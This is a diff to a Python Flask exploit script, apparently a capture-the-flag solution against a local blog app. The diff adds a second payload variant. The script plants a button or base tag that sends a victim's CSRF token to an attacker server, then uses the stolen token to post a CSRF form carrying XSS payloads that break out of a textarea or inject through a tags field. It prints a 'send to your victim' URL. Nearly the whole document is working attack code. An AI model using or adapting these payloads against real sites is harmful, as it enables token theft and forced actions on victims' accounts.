@@ -6,12 +6,15 @@ import os
 
 TARGET_DOMAIN = "http://127.0.0.1:1337"
 HOST_DOMAIN = "http://127.0.0.1:5001"
-PROXIES = {"http":"http://127.0.0.1:8080"}
+PROXIES = {}
+
+VARIANT = 1
 
 app = Flask(__name__)
 
 @app.route("/", methods=["GET", "POST"])
-def index_view():
+@app.route("/comment/<user_id>", methods=["GET", "POST"])
+def index_view(user_id=None):
     csrf_token = request.form['csrf_token']
     url = create_csrf(csrf_token)
     print(f"Stolen token: {csrf_token}")
@@ -50,33 +53,55 @@ def publish_blog(content):
     return res.url
 
 def create_csrf(csrf_token):
-    # <textarea></textarea>
-    xss_payload = '''
-        comment"); alert(document.querySelector(".navbar-brand").innerText.split(" ")[2]);//
-        <noscript><p title='</noscript>&lt;/TEXTAREA&gt; <div></div></FORM><xx swallow="'>
-        </p></noscript>
-    '''
-    csrf_payload = f""""       
-        <form action="/edit" method="POST">
-            <input type="hidden" name="csrf_token" value="{ csrf_token }"/>
-            <textarea name="content">
-            { xss_payload }
-            </textarea>
-            <input type=hidden name=tags value=abcabc />
-            <input id="share-button" type="submit">Click</input>
-        </form>
-    """
+    if VARIANT == 1:
+        xss_payload = '''
+            comment"); alert(document.querySelector(".navbar-brand").innerText.split(" ")[2]);//
+            <noscript><p title='</noscript>&lt;/TEXTAREA&gt; <div></div></FORM><xx swallow="'>
+            </p></noscript>
+        '''
+        csrf_payload = f""""       
+            <form action="/edit" method="POST">
+                <input type="hidden" name="csrf_token" value="{ csrf_token }"/>
+                <textarea name="content">
+                { xss_payload }
+                </textarea>
+                <input type=hidden name=tags value=abcabc />
+                <input id="share-button" type="submit">Click</input>
+            </form>
+        """
+
+    if VARIANT == 2:
+        tags = ' ,"+alert(document.querySelector("a.navbar-brand").text.split("-")[1].trim())+"'
+        csrf_payload = f""""       
+            <form action="/edit" method="POST">
+                <input type="hidden" name="csrf_token" value="{ csrf_token }"/>
+                <textarea name="content">
+                </textarea>
+                <input type=hidden name=tags value="{tags.replace('"', '&quot;')}" />
+                <input id="share-button" type="submit">Click</input>
+            </form>
+        """
     url = publish_blog(csrf_payload)
     return url
 
 def prepare():    
-    content = f"""
-        <input id="share-button" formaction="{HOST_DOMAIN}" type="submit" form="comment-form">
-            DO NOT CLICK ME
-        </input>
-    """
+    if VARIANT == 1:
+        content = f"""
+            <input id="share-button" formaction="{HOST_DOMAIN}" type="submit" form="comment-form">
+                DO NOT CLICK ME
+            </input>
+        """
+
+    if VARIANT == 2:
+        content = f"""
+            <base href="{HOST_DOMAIN}">
+            <input id="share-button" type="submit" form="comment-form">
+                DO NOT CLICK ME
+            </input>
+        """
+
     url = publish_blog(content)
-    print(f"Send the following URL to your vitim:\n{url}?share")
+    print(f"Send the following URL to your victim:\n{url}?share")
     
 if __name__ == '__main__':
     prepare()
